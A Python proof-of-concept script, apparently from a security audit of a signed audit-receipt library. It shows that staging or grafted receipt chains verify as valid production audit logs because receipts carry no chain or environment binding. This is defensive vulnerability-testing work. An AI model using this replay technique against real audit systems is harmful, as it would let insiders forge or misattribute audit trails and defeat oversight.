#!/usr/bin/env python3
"""S2.3/S2.4: cross-context replay — receipts carry NO chain/environment
identifier. Any receipt with prev_chain_hash='GENESIS' from ANY context is a
valid standalone chain. A receipt minted for staging (or for a different
product line, or extracted from a disclosure) replays into a production
audit with all_links_valid=True. There is no domain separation beyond the
global predicateType, and no chain ID binding receipts to their log.

A10 ('forged genesis') only tested presenting r2 (whose prev is NOT
'GENESIS') alone; it never tested a genuinely valid genesis receipt from
another chain.

Prints EXPLOIT-WORKS if a foreign-chain receipt verifies as a valid chain.
"""
import sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (build_receipt, chain_hash, generate_keypair,
                         verify_chain, verify_receipt, sha256_hex)

HUMAN = {"type": "human", "id": "s.lutar", "is_service_account": False,
         "auth_method": "hardware_key", "human_principal": "Stephen P. Lutar"}
POL = {"result": "ALLOW", "policy_hash": sha256_hex(b"policy-v1")}
EXEC = {"side_effect_class": "WRITE_REVERSIBLE", "status": "EXECUTED"}
EV = [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}]

sk, pk = generate_keypair()   # same signing key used in both environments

# Production chain the auditor expects
p1 = build_receipt(action_id="prod-001", subject_name="prod:payments",
                   actor=HUMAN, policy_decision=POL, execution=EXEC,
                   evidence_items=EV, prev_chain_hash="GENESIS", signing_key=sk)
# Staging chain (same key — shared keys across envs is the norm in audits)
s1 = build_receipt(action_id="staging-001", subject_name="staging:payments",
                   actor=HUMAN, policy_decision=POL, execution=EXEC,
                   evidence_items=EV, prev_chain_hash="GENESIS", signing_key=sk)
s2 = build_receipt(action_id="staging-002", subject_name="staging:payments",
                   actor=HUMAN, policy_decision=POL, execution=EXEC,
                   evidence_items=EV, prev_chain_hash=chain_hash(s1), signing_key=sk)

exploit = False

# V1: staging chain presented as THE chain to a production auditor.
res = verify_chain([s1, s2], pk)
print(f"[V1] foreign (staging) chain presented as audit log -> all_links_valid={res['all_links_valid']}")
if res["all_links_valid"]:
    exploit = True

# V2: single foreign receipt verified standalone — nothing flags wrong-context.
v = verify_receipt(s1, pk)
print(f"[V2] foreign genesis receipt standalone -> {v.verdict}")
if v.verdict == "PASS":
    exploit = True

# V3: hybrid — production genesis + staging continuation grafted on.
# (Requires the insider to build the bridge, but shows link math has no
# context check: a chain can silently switch environments mid-stream.)
bridge_pred_chain = chain_hash(p1)
b2 = build_receipt(action_id="staging-002", subject_name="staging:payments",
                   actor=HUMAN, policy_decision=POL, execution=EXEC,
                   evidence_items=EV, prev_chain_hash=bridge_pred_chain, signing_key=sk)
res = verify_chain([p1, b2], pk)
print(f"[V3] prod genesis + staging graft -> all_links_valid={res['all_links_valid']} "
      f"(chain silently switches environment at index 1)")
if res["all_links_valid"]:
    exploit = True

print("EXPLOIT-WORKS" if exploit else "HELD")
